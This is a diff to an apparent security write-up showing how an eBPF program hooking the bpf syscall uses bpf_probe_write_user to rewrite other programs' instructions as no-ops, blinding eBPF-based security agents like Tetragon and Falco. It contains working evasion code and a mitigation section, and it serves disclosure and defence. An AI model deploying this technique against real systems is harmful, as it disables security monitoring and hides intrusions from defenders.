@@ -127,24 +127,24 @@ int handle_bpf_enter(struct trace_event_raw_sys_enter *ctx)
                         return 0;
                 }
 
+		struct bpf_insn nop_insn = {
+			.code = BPF_ALU64 | BPF_MOV | BPF_K,
+			.dst_reg = BPF_REG_0,
+			.src_reg = BPF_REG_0,
+			.off = 0,
+			.imm = 0
+		};
+
                 // Iterate over the instructions passed by userspace and convert them to no-ops.
                 for (__u32 i = 0; i < TARGET_BPF_INSNS; i++) {
                         bpf_probe_read_user(&insn, sizeof(insn), &((struct bpf_insn *)uattr.insns)[i]);
-
-                        // Overwrite the user bpf_insn with a no-op instruction
-                        struct bpf_insn nop_insn = {
-                                .code = BPF_ALU64 | BPF_MOV | BPF_K,
-                                .dst_reg = BPF_REG_0,
-                                .src_reg = BPF_REG_0,
-                                .off = 0,
-                                .imm = 0
-                        };
 
                         // The last instruction has to be a jmp or exit
                         if (i == insn_cnt-1) {
                                 nop_insn.code = BPF_EXIT;
                         }
 
+			// Overwrite the user bpf_insn with a no-op instruction
                         bpf_probe_write_user(&((struct bpf_insn *)uattr.insns)[i], &nop_insn, sizeof(nop_insn));
                 }
         }
@@ -193,7 +193,7 @@ In the `tetra` window, we only process `exit` events! No execution events are pr
 
 ### Impact
 
-While we're focusing on bypassing Tetragon in this example, *ALL SECURITY AGENTS THAT USE eBPF ARE VULNERABLE TO THIS ATTACK*.
+While we're focusing on bypassing Tetragon in this example, all security agent using eBPF are vulnerable to this attack.
 
 #### Sysdig/Falco
 <demo video>
@@ -225,17 +225,7 @@ This is impractical and not scalable, though.
 
 ### Mitigation
 
-`bpf_probe_write_user` is the helper that's used to overwrite the contents of userspace memory in the eBPF programs. This function is considered dangerous, and distributions may benefit from disabling it altogether. As of this writing, the latest version of Ubuntu (Noble) still has it enabled by default:
-
-```shell
-dave@ubuntu24:~$ uname -a
-Linux ubuntu24 6.8.0-38-generic #38-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun  7 15:25:01 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
-dave@ubuntu24:~$ sudo cat /proc/kallsyms |grep bpf_probe_write_user
-[sudo] password for dave:
-ffffffffb74e6dd0 T __pfx_bpf_probe_write_user
-ffffffffb74e6de0 T bpf_probe_write_user
-ffffffffb88362e0 d bpf_probe_write_user_proto
-```
+`bpf_probe_write_user` is the helper that's used to overwrite the contents of userspace memory in the eBPF programs. This function is considered dangerous, and distributions may benefit from disabling it altogether. As of this writing, the latest version of Ubuntu (Noble) still has it enabled by default.
 
 Ideally, trusted eBPF programs should be protected by hardware, as other secure programs and secrets are, using the Trusted Platform Module (TPM). Keys could be loaded into the Linux bootloader, similar to how Secureboot installs keys, and then used by the kernel to decrypt and load the programs, ensuring they have not been altered.
 
